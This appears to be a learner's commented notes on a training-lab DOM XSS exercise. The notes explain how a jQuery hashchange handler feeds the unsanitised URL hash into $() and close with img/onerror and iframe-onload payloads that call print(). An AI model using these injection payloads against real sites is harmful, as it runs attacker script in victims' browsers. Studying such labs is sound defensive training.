/*

//jquery selector functions have the ability to create HTML elements if passed as
$(HTML_CODE_HERE)
//our goal becomes to pass our payload to the $() funcction

$(window).on('hashchange', function(){ 
    var post = $('section.blog-list 
    h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); 
    if (post) post.get(0).scrollIntoView(); 
}); 

//selector function selects the window annd listens for a hashchange evvent
In jQuery, the hashchange event is triggered when there is a change in the hash portion 
of the URL in the browser's address bar. 
The hash portion is the part of the URL that follows the "#" symbol.

//on the hashchange it creates a variable called post and a jquery selector is assigned to it
//the section of class blog-list inside which it looks for an h2 element

//decodeURIComponent(window.location.hash.slice(1)) gets the hash value from the URL, 
    removes the leading "#" symbol using slice(1), 
    and then decodes any URL-encoded characters using decodeURIComponent().

//h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ') is a 
    jQuery selector that targets <h2> elements containing the decoded hash value as text

//appending #<term> will result in autoscrolled-into-focus a blogpost with <term> in its h2


#<img src=1 onerror="print()">
but we need to change the hash value at the victim's browser automatically
not like we can enter # and change what follows in our window

<iframe src="https://0af7008e033a5315815294de00350046.web-security-academy.net/#123" onload="this.src=this.src+'<img src=x onerror=print()>'"/>
*/